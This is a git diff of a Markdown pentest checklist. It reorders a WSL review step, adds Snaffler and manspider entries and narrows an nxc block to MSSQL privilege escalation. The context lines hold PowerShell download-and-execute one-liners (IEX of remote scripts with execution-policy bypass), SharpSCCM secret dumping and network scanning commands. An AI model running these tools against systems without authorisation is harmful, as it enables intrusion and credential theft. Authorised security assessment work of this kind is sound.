@@ -38,6 +38,10 @@ New-Item -ItemType Directory -Path "$env:USERPROFILE\Downloads\fkad" -Force; who
 ```ps
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1')
 ```
+- [ ] WSL Access Review
+```cmd
+wsl --list --verbose | Out-File "$out\wsl.txt"
+```
 - [ ] PrivEscCheck.ps1
 ```powershell
 powershell -ep bypass -c "Invoke-Expression -Command (Invoke-RestMethod 'https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT"
@@ -61,12 +65,7 @@ IEX (iwr 'https://raw.githubusercontent.com/techspence/ScriptSentry/main/ScriptS
 IEX (iwr 'https://raw.githubusercontent.com/techspence/AppLockerInspector/main/Invoke-AppLockerInspector.ps1')
 Invoke-AppLockerInspector -Verbose | Format-Table -Auto
 ```
-- [ ] WSL Access Review
-```cmd
-wsl --list --verbose
-C:\Windows\System32\bash.exe
-C:\Windows\System32\wsl.exe
-```
+- [ ] Snaffler
 - [ ] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
 ```powershell
 SharpSCCM.exe local secrets -m disk
@@ -90,13 +89,11 @@ Most likely these should be run across the network as well.
 nmap -p80,443 -oX nmap.xml 10.192.14.0/24
 gowitness scan nmap -f nmap.xml --open-only --service-contains http
 ```
-- [ ] nxc
+- [ ] MSSQL privilege escalation
 ```sh
-# Share enumeratio
-nxc smb <subnet> -u <user> -p <pass> --shares
-# MSSQL privilege escalation
 nxc mssql <subnet> -u <user> -p <pass> -M mssql_priv
 ```
+- [ ] manspider (snaffler from attack box)
 
 ## Security / Legal
 
